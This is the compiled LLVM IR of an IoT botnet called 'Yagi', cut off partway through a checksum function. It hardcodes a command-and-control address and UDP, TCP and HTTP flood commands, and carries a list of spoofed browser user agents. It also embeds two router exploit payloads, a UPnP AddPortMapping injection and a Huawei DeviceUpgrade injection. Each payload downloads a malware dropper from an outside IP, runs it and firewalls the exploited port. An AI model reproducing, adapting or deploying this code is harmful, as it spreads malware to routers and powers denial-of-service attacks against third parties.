; ModuleID = 'host/ir_O3/Yagi.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.exploit_scanner_connection = type { i32, i32, i32, i32, i16, i32, [256 x i8], i8**, [2560 x i8], [2560 x i8], i32 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }

@c2_bot_port = local_unnamed_addr global i32 27, align 4
@c2_http_host = local_unnamed_addr global i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0), align 8
@.str = private unnamed_addr constant [15 x i8] c"185.244.25.149\00", align 1
@numattackpids = local_unnamed_addr global i64 0, align 8
@UserAgents = local_unnamed_addr global [39 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.39, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.2 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.3 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.4 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.5 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.6 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.7 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.8 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.9 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.10 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.11 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.12 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.13 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.14 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.15 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.16 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.17 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.18 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.19 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.20 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.21 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.22 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.23 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@.str.24 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.25 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.26 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\00", align 1
@.str.27 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.28 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.29 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.30 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.31 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\00", align 1
@.str.32 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.33 = private unnamed_addr constant [83 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)\00", align 1
@.str.34 = private unnamed_addr constant [142 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00", align 1
@.str.35 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.36 = private unnamed_addr constant [79 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.37 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.38 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre\00", align 1
@.str.39 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@attackpids = common local_unnamed_addr global i32* null, align 8
@retry = local_unnamed_addr global i32 1, align 4
@retrys = local_unnamed_addr global i32 3, align 4
@tryagain = local_unnamed_addr global i32 1, align 4
@max_attacks = local_unnamed_addr global i32 4, align 4
@maxboot_time = local_unnamed_addr global i32 600, align 4
@trigger = local_unnamed_addr global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.54, i64 0, i64 0), align 8
@.str.54 = private unnamed_addr constant [2 x i8] c"@\00", align 1
@C2 = local_unnamed_addr global i32 -1, align 4
@ioctl_pid = local_unnamed_addr global i32 0, align 4
@c2_host = common global [16 x i8] zeroinitializer, align 16
@Socket = common global %struct.sockaddr_in zeroinitializer, align 4
@buf = common global [1024 x i8] zeroinitializer, align 16
@buffer = common local_unnamed_addr global i32 0, align 4
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@pongresponse = common local_unnamed_addr global [25 x i8] zeroinitializer, align 16
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.40 = private unnamed_addr constant [16 x i8] c"/usr/dict/words\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.44 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.45 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.46 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.48 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.49 = private unnamed_addr constant [19 x i8] c"Invalid flag \22%s\22\0A\00", align 1
@.str.50 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.51 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.52 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.53 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [15 x i8] c"arch yagi.%s\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [5 x i8] c"kill\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"stop\00", align 1
@.str.58 = private unnamed_addr constant [9 x i8] c"killattk\00", align 1
@.str.59 = private unnamed_addr constant [3 x i8] c"kt\00", align 1
@.str.60 = private unnamed_addr constant [4 x i8] c"udp\00", align 1
@.str.61 = private unnamed_addr constant [9 x i8] c"udpflood\00", align 1
@.str.62 = private unnamed_addr constant [4 x i8] c"tcp\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"tcpflood\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"stdflood\00", align 1
@.str.66 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.67 = private unnamed_addr constant [10 x i8] c"httpflood\00", align 1
@.str.68 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.69 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.70 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"PONG\0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [11 x i8] c"killc2proc\00", align 1
@exploit_scanner_pid = local_unnamed_addr global i32 0, align 4
@exploit_fake_time = local_unnamed_addr global i32 0, align 4
@conn_table = common local_unnamed_addr global %struct.exploit_scanner_connection* null, align 8
@exploit_rsck = local_unnamed_addr global i32 0, align 4
@exploit_scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.73 = private unnamed_addr constant [920 x i8] c"POST /UD/?9 HTTP/1.1\0D\0AUser-Agent: SEFA\0D\0AContent-Type: text/xml\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47449</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`>/tmp/.e && cd /tmp; >/var/dev/.e && cd /var/dev; wget http://89.34.26.138/yagi.sh -O - > yagi.sh; chmod 777 yagi.sh; sh yagi.sh; rm yagi.sh; iptables -A INPUT -p tcp --destination-port 5555 -j DROP`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\00", align 1
@huawei_scanner_pid = local_unnamed_addr global i32 0, align 4
@huawei_fake_time = local_unnamed_addr global i32 0, align 4
@huawei_rsck = local_unnamed_addr global i32 0, align 4
@huawei_scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.77 = private unnamed_addr constant [887 x i8] c"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\0D\0AContent-Length: 430\0D\0AConnection: keep-alive\0D\0AAccept: */*\0D\0AAuthorization: Digest username=\22dslf-config\22, realm=\22HuaweiHomeGateway\22, nonce=\2288645cefb1f9ede0e336e3569d75ee30\22, uri=\22/ctrlt/DeviceUpgrade_1\22, response=\223612f843a42db38f48f59d2a3597e19c\22, algorithm=\22MD5\22, qop=\22auth\22, nc=00000001, cnonce=\22248d1a2560100669\22\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:Upgrade xmlns:u=\22urn:schemas-upnp-org:service:WANPPPConnection:1\22><NewStatusURL>$(/bin/busybox wget -g 89.34.26.138 -l /tmp/yagi -r /bins/yagi.mips; /bin/busybox chmod 777 * /tmp/yagi; /tmp/yagi ; /bin/busybox iptables -A INPUT -p tcp --destination-port 37215 -j DROP)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\0D\0A\0D\0A\00", align 1
@x = internal unnamed_addr global i32 0, align 4
@y = internal unnamed_addr global i32 0, align 4
@z = internal unnamed_addr global i32 0, align 4
@w = internal unnamed_addr global i32 0, align 4
@.str.84 = private unnamed_addr constant [15 x i8] c"M\06\07\14M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.1.85 = private unnamed_addr constant [20 x i8] c"M\06\07\14M\0F\0B\11\01M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.2.86 = private unnamed_addr constant [24 x i8] c"M\06\07\14M$65&6SRS=\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.3.87 = private unnamed_addr constant [25 x i8] c"M\06\07\14M$65&6SRS>B\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.4.88 = private unnamed_addr constant [16 x i8] c"M\06\07\14M\15\03\16\01\0A\06\0D\05Rb\00", align 1
@.str.5.89 = private unnamed_addr constant [23 x i8] c"M\07\16\01M\06\07\04\03\17\0E\16M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.6.90 = private unnamed_addr constant [16 x i8] c"M\11\00\0B\0CM\15\03\16\01\0A\06\0D\05b\00", align 1
@table = common local_unnamed_addr global [8 x %struct.table_value] zeroinitializer, align 16
@table_key = local_unnamed_addr global i32 -554832193, align 4
@switch.table = private unnamed_addr constant [3 x i32] [i32 -1677721600, i32 -989855744, i32 687865856]

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
min.iters.checked:
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %1 = add i32 %0, -1640531527
  store i32 %1, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %2 = add i32 %0, 1013904242
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  %vector.recur.init = insertelement <2 x i32> undef, i32 %0, i32 1
  %load_initial = load <2 x i32>, <2 x i32>* bitcast (i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1) to <2 x i32>*), align 4
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %min.iters.checked
  %store_forwarded = phi <2 x i32> [ %load_initial, %min.iters.checked ], [ %16, %vector.body ]
  %index = phi i64 [ 0, %min.iters.checked ], [ %index.next.1, %vector.body ]
  %vector.recur = phi <2 x i32> [ %vector.recur.init, %min.iters.checked ], [ %8, %vector.body ]
  %vec.ind = phi <2 x i64> [ <i64 3, i64 4>, %min.iters.checked ], [ %vec.ind.next.1, %vector.body ]
  %3 = or i64 %index, 3
  %4 = shufflevector <2 x i32> %vector.recur, <2 x i32> %store_forwarded, <2 x i32> <i32 1, i32 2>
  %5 = trunc <2 x i64> %vec.ind to <2 x i32>
  %6 = xor <2 x i32> %5, <i32 -1640531527, i32 -1640531527>
  %7 = xor <2 x i32> %6, %4
  %8 = xor <2 x i32> %7, %store_forwarded
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %3
  %10 = bitcast i32* %9 to <2 x i32>*
  store <2 x i32> %8, <2 x i32>* %10, align 4
  %vec.ind.next = add <2 x i64> %vec.ind, <i64 2, i64 2>
  %11 = add nsw i64 %index, 5
  %12 = shufflevector <2 x i32> %store_forwarded, <2 x i32> %8, <2 x i32> <i32 1, i32 2>
  %13 = trunc <2 x i64> %vec.ind.next to <2 x i32>
  %14 = xor <2 x i32> %13, <i32 -1640531527, i32 -1640531527>
  %15 = xor <2 x i32> %14, %12
  %16 = xor <2 x i32> %15, %8
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %11
  %18 = bitcast i32* %17 to <2 x i32>*
  store <2 x i32> %16, <2 x i32>* %18, align 4
  %index.next.1 = add nsw i64 %index, 4
  %vec.ind.next.1 = add <2 x i64> %vec.ind, <i64 4, i64 4>
  %19 = icmp eq i64 %index.next.1, 4092
  br i1 %19, label %middle.block, label %vector.body, !llvm.loop !1

middle.block:                                     ; preds = %vector.body
  br label %._crit_edge

._crit_edge:                                      ; preds = %middle.block
  %vector.recur.extract = extractelement <2 x i32> %8, i32 1
  %20 = load i32, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4093), align 4
  %21 = xor i32 %vector.recur.extract, -1640532410
  %22 = xor i32 %21, %20
  store i32 %22, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4095), align 4
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  store i32 %18, i32* %5, align 4
  ret i32 %18
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #12
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #3 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv33 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv33, 4
  br i1 %min.iters.check, label %.lr.ph16.preheader34, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph16.preheader
  %8 = zext i32 %addconv33 to i64
  %9 = and i32 %addconv33, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end27 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph16.preheader34, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi28 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load31 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load31 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi28
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !4

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx32 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx32, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge17.loopexit, label %.lr.ph16.preheader34

.lr.ph16.preheader34:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph16.preheader
  %.014.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph16.preheader ], [ %19, %middle.block ]
  %.0913.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph16.preheader ], [ %ind.end, %middle.block ]
  %.01012.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph16.preheader ], [ %ind.end27, %middle.block ]
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16.preheader34, %.lr.ph16
